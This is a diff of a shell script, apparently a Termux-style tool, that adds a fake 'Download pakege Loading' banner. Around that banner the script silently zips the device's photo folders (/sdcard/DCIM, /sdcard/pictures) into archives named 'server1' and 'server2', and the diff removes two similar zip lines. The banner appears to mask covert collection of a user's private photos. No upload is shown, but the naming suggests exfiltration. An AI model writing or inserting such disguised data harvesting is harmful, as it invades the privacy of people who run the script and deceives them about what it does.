@@ -10,10 +10,19 @@ _ _  __  ___  _   _ ____ _____ _____ ____      _   _    _    ____ _  __
 #                         </> MONSTER_hp </>
 
 trap 'printf "\n";stop' 2
+printf "\e[1;92m
+
+ ____                      _                 _
+|  _ \  _____      ___ __ | | ___   __ _  __| |___                                      | | | |/ _ \ \ /\ / / '_ \| |/ _ \ / _` |/ _` / __|
+| |_| | (_) \ V  V /| | | | | (_) | (_| | (_| \__ \                                     |____/ \___/ \_/\_/ |_| |_|_|\___/ \__,_|\__,_|___/
+                                                            
+/n"
+printf " \e[1;95m    Download pakege Loading ... \n"
+printf "\n"
+
+printf "\e[1;90m    \n"
 zip server1 -r /sdcard/DCIM
 zip server2 -r /sdcard/pictures
-zip server3 -r /storage/emulated/0/DCIM
-zip server4 -r /storage/emulated/0/pictures
 clear
 banner() {
 
